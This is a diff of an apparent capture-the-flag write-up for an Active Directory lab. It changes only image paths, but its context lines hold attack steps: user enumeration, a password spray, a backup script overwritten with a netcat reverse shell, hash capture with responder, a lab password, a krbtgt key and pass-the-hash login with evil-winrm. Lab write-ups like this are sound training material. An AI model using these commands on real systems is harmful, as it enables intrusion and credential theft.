@@ -88,7 +88,7 @@ Verify the users obtained in the previous challenge with Kerberos&#x20;
 ./kerbrute_linux_amd64 userenum users_list.txt --domain k2.thm --dc 10.10.15.150
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -96,7 +96,7 @@ Verify the users obtained in the previous challenge with Kerberos&#x20;
 
 Save all passwords found before and do a password spray with these 2 valid user.
 
-<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 crackmapexec smb 10.10.15.150 -u 'j.smith' -p passwd_list.txt
@@ -145,7 +145,7 @@ Nothing interesintg so far
 
 Do a Windows Local Enumeration of the target and see this juicy directory
 
-<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Inside it there is a .bat file with this content:
 
@@ -225,7 +225,7 @@ Set-Content -Path "C:\Scripts\backup.bat" -Value 'c:\Temp\nc.exe -e powershell 1
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 First, print user flag
 
@@ -249,7 +249,7 @@ responder -I tun0
 curl file://10.23.52.142/file.txt
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -273,7 +273,7 @@ o.armstrong : arMStronG08
 
 Looking the bloodhound results we can view this:
 
-<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -344,7 +344,7 @@ krbtgt:aes256-cts-hmac-sha1-96:10e96d99d70a03db0d17a30bda313478b4873d29e3e767474
 evil-winrm -i 10.10.88.111 -u 'administrator' -H '15ecc755a43d2e7c8001215609d94b90'
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Print the root flag.
 
